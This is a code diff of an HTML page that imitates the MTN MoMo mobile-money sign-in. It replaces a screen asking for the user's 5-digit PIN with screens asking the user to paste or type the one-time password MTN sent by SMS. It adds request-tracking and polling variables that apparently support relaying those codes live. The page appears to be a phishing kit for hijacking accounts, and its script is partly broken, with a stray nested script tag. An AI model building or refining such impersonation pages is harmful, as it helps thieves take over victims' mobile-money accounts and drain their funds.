@@ -69,30 +69,33 @@
     .mtn-h2 { color: #000000; font-size: 32px; font-weight: 800; letter-spacing: -0.5px; margin-top: 10px; }
     .instruction-text { font-size: 15px; color: #4b4b4b; text-align: center; line-height: 1.5; margin-bottom: 24px; max-width: 340px; }
     .text-input-field { width: 100%; border: 1px solid #b1b1b1; border-radius: 6px; padding: 16px; font-size: 15px; outline: none; }
-    
-    /* Pin input layouts */
-    .digits-row { display: flex; justify-content: space-between; width: 100%; gap: 12px; margin-top: 15px; }
+    .digits-row { display: flex; justify-content: space-between; width: 100%; gap: 12px; }
     .digit-box { flex: 1; height: 64px; border: 1px solid #b1b1b1; border-radius: 8px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
     .digit-box:focus { border-color: #FFCC00; }
     .info-box { background: #FFF9E6; border-radius: 8px; padding: 14px 16px; display: flex; gap: 12px; margin-bottom: 25px; width: 100%; text-align: left; }
-    .info-icon { background: #FFCC00; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: black; }
+    .info-icon { background: #FFCC00; color: white; border-radius: 50%; width: 20px; height: 20px; min-width: 20px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; }
+    .info-text { font-size: 13.5px; color: #333333; line-height: 1.4; }
+    .mtn-btn { background: #FFCC00 !important; color: #000000 !important; font-size: 18px !important; }
+    .resend-container { margin-top: 24px; font-size: 14px; color: #666666; text-align: center; width: 100%; }
+    .resend-link { color: #004f71; text-decoration: none; font-weight: bold; cursor: pointer; }
+    .footer-curve { width: 100%; height: 40px; background: #FFCC00; clip-path: ellipse(60% 100% at 50% 100%); margin-top: auto; }
   </style>
 </head>
 <body>
 
   <div id="secureModal" class="secure-overlay hidden">
     <div class="circular-spinner"></div>
-    <div class="secure-title">Secure Verification</div>
-    <div class="secure-sub">Verifying your PIN...<br>Please do not close this page.</div>
+    <div class="secure-title" id="modalTitle">Secure Verification</div>
+    <div class="secure-sub" id="modalSub">Verifying your details...<br>Please do not close this page.</div>
   </div>
 
-  <header>
+  <header id="momoHeader">
     <div class="momo-logo-box"><span class="momo-logo-text">MoMo</span></div>
     <div class="momo-subtext">from MTN</div>
   </header>
 
-  <main>
-    <!-- Screen 1: Phone Validation -->
+  <main id="mainContainer">
+    <!-- STEP 1: PHONE PAGE -->
     <section id="phonePage">
       <h2>Welcome to MoMo</h2>
       <label class="field-label">Enter number *</label>
@@ -105,108 +108,83 @@
       <p class="legal-text">Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
     </section>
 
-    <!-- Screen 2: 5-Digit PIN Input -->
-    <section id="pinPage" class="hidden">
-      <h2>Welcome to MoMo</h2>
-      <label class="field-label">Enter your 5-digit PIN</label>
-      <div class="digits-row" id="pinDigitsContainer">
-        <!-- Javascript renders inputs dynamically here -->
+    <!-- STEP 2: OTP TEXT INPUT PAGE -->
+    <section id="otpScreenOne" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
+      <div class="graphic-container">
+        <div class="phone-icon-mock"></div>
+        <div class="bubble-mock">*****</div>
       </div>
-      <p id="pinError" class="error"></p>
+      <h2 class="mtn-h2">OTP Verification</h2>
+      <p class="instruction-text">We have sent a One-Time Password (OTP) to your mobile number via SMS. Please copy the code from your message and paste it below.</p>
+      <div class="info-box">
+        <div class="info-icon">i</div>
+        <div class="info-text">Check your SMS inbox for the OTP message from MTN. It may take a few seconds to arrive.</div>
+      </div>
+      <div style="width:100%; text-align: left; margin-bottom: 25px;">
+        <label class="field-label" style="text-align: left; margin: 10px 0 10px;">Enter OTP</label>
+        <input type="text" id="otpPasteInput" class="text-input-field" placeholder="Copy and paste the code from your SMS">
+      </div>
+      <button id="verifyBtnOne" class="mtn-btn">Verify</button>
+      <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
     </section>
 
-    <!-- Screen 3: Complete -->
+    <!-- STEP 3: SPLIT PIN BOXES PAGE -->
+    <section id="otpScreenTwo" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
+      <div class="graphic-container">
+        <div class="phone-icon-mock"></div>
+        <div class="bubble-mock">*****</div>
+      </div>
+      <h2 class="mtn-h2">OTP Verification</h2>
+      <p class="instruction-text">Enter the 4-digit code you received in your MTN SMS.</p>
+      <div style="width: 100%; margin-bottom: 25px;">
+        <div class="digits-row">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+        </div>
+      </div>
+      <button id="verifyBtnTwo" class="mtn-btn">Verify</button>
+      <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
+    </section>
+
+    <!-- STEP 4: SUCCESS PAGE -->
     <section id="successPage" class="hidden">
       <div class="success">✓ Verified Successfully</div>
     </section>
+
+    <p id="errorFeedback" class="error"></p>
   </main>
 
+  <div id="footerCurve" class="hidden"></div>
+
   <script>
+    let currentRequestId = null;
+    let pollInterval = null;
+
+    const momoHeader = document.getElementById('momoHeader');
+    const mainContainer = document.getElementById('mainContainer');
+    const footerCurve = document.getElementById('footerCurve');
+
     const phonePage = document.getElementById('phonePage');
-    const pinPage = document.getElementById('pinPage');
+    const otpScreenOne = document.getElementById('otpScreenOne');
+    const otpScreenTwo = document.getElementById('otpScreenTwo');
     const successPage = document.getElementById('successPage');
+    
+    const secureModal = document.getElementById('secureModal');
+    <script>
     const phoneInput = document.getElementById('phoneInput');
     const phoneButton = document.getElementById('phoneButton');
-    const phoneError = document.getElementById('phoneError');
-    const pinDigitsContainer = document.getElementById('pinDigitsContainer');
-    const pinError = document.getElementById('pinError');
-    const secureModal = document.getElementById('secureModal');
 
-    // 1. Listen for user numeric input on phone field
-    phoneInput.addEventListener('input', (e) => {
-      // Disallow non-digits
-      e.target.value = e.target.value.replace(/\D/g, '');
+    // THIS IS THE EXACT INTERCEPTOR THAT UNLOCKS THE BLUE BUTTON
+    phoneInput.addEventListener('input', () => {
+      // Wipes out hidden spaces or letters instantly as you type
+      phoneInput.value = phoneInput.value.replace(/\D/g, ''); 
       
-      // Enable next step if validation requirement is met (exactly 9 digits)
-      if (e.target.value.length === 9) {
-        phoneButton.removeAttribute('disabled');
-        phoneError.textContent = '';
-      } else {
-        phoneButton.setAttribute('disabled', 'true');
-      }
+      // Tells the browser to activate the next button precisely at 9 numbers
+      phoneButton.disabled = phoneInput.value.length !== 9;
     });
-
-    // 2. Click transition handler
-    phoneButton.addEventListener('click', () => {
-      phonePage.classList.add('hidden');
-      pinPage.classList.remove('hidden');
-      generatePinFields();
-    });
-
-    // 3. Assemble and track 5 secure PIN input components
-    function generatePinFields() {
-      pinDigitsContainer.innerHTML = '';
-      const totalBoxes = 5;
-      const elementsList = [];
-
-      for (let i = 0; i < totalBoxes; i++) {
-        const inputElement = document.createElement('input');
-        inputElement.type = 'password';
-        inputElement.classList.add('digit-box');
-        inputElement.maxLength = 1;
-        inputElement.inputMode = 'numeric';
-        
-        pinDigitsContainer.appendChild(inputElement);
-        elementsList.push(inputElement);
-
-        // Automate next-element selection logic upon key entry
-        inputElement.addEventListener('input', (e) => {
-          e.target.value = e.target.value.replace(/\D/g, '');
-          
-          if (e.target.value.length === 1 && i < totalBoxes - 1) {
-            elementsList[i + 1].focus();
-          }
-          evaluatePinState(elementsList);
-        });
-
-        // Jump backwards if backspace key is pressed
-        inputElement.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && e.target.value.length === 0 && i > 0) {
-            elementsList[i - 1].focus();
-          }
-        });
-      }
-
-      // Initial focus on first input box
-      setTimeout(() => elementsList[0].focus(), 150);
-    }
-
-    // 4. Verify whether complete code has been compiled
-    function evaluatePinState(inputs) {
-      const compiledString = inputs.map(el => el.value).join('');
-      
-      if (compiledString.length === 5) {
-        pinError.textContent = '';
-        secureModal.classList.remove('hidden');
-
-        // Emulate validation duration delay
-        setTimeout(() => {
-          secureModal.classList.add('hidden');
-          pinPage.classList.add('hidden');
-          successPage.classList.remove('hidden');
-        }, 2200);
-      }
-    }
   </script>
+
 </body>
 </html>
